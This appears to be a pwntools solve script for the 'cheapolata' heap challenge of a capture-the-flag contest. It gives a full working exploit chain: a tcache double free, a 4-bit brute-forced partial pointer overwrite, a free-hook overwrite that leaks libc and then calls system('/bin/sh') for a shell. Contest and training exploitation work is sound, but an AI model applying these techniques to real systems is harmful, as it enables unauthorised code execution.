from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./cheapolata_patched"
args = []
io: process = None

speed = 0.1

def debug():
    gdb.attach(io, gdbscript=
    """
    define current
    x/10xg (void*)a-0x10
    end
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challenges.france-cybersecurity-challenge.fr", port=2106)

def launch_local():
    global file, io
    # io = remote(host="localhost", port=1234)
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    # l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    return d[a_+len(a):d.find(b, a_)] # returns stuff between a & b

def alloc(size, data):
    sla(b"exit\n", b"1")
    sleep(speed)
    sl(str(size).encode())
    sleep(speed)
    if size == 0:
        return
    sl(data)
    sleep(speed)

def free():
    sla(b"exit\n", b"2")
    sleep(speed)

def quit():
    sla(b"exit\n", b"3")

exe = ELF(file)
libc = ELF("./libc.so.6")

# exploit goes here

def exploit():
    guess = rnd.randint(0, 0xf)
    print("guess: %#x" % guess)
    sleep(speed)

    alloc(2, b"") # double free 0x20 sized chunk (to later hijack tcache_perthread_struct)
    free()
    free()

    hijack_address = (guess << 12) + 0x50
    alloc(2, p16(hijack_address)) # partial overwrite fd with 4 bit bruteforce
    alloc(2, b"") # unused malloc to set tcache entry = fake fd

    payload = flat([ # prepare tcache_perthread_struct overwrite payload
        exe.sym["stderr"], # 0x20, will use to leak libc
        exe.sym["old_free_hook"], # 0x30, will use to overwrite old_free_hook with puts
        exe.sym["old_free_hook"], # 0x40, will use to overwrite old_free_hook with system
    ])
    alloc(0x18, payload) # overwrite tcache_perthread_struct
    
    alloc(0x28, p64(exe.plt["puts"])[:7]) # overwrite free_hook with puts plt
    alloc(1, b"A")
    free() # leak stderr

    leak = recv()
    leak += io.recv(timeout=speed)

    leak = b"A" + getb(leak, b"exit\n>>> A", b"\n=====")
    libc.address = (u64(leak) & ~0xfff) - 0x3ec000
    print("libc: %#018x" % libc.address)

    if libc.address == 0x6e65746e6f046000: # quick fix
        raise EOFError()

    sleep(speed) # manual malloc because recv() emptied the buffer so sendlineafter won't work
    sl(b"1")
    sleep(speed)
    sl(str(0x38).encode())
    sleep(speed)
    sl(p64(libc.sym["system"])) # overwrite old_free_hook with system

    alloc(0x18, b"/bin/sh\0")
    free() # call system("/bin/sh")

    io.interactive() # enjoy your shell
    input("end")
    exit()

while True:
    sleep(speed)
    launch()
    try:
        exploit()
    except EOFError:
        print("fail :(")
    io.close()